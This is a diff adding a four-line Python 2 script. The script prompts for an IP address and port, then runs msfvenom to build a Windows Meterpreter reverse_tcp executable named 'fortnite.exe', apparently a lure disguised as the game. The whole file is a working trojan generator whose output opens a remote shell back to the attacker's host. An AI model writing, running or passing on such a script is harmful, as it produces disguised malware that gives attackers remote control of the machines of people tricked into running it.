@@ -1,0 +1,4 @@
+import os
+LHOST = raw_input("input your ip adress:")
+LPORT = raw_input("input your port:")
+os.system("msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=%s LPORT=%s -o /root/Desktop/fortnite.exe" % (LHOST, LPORT))
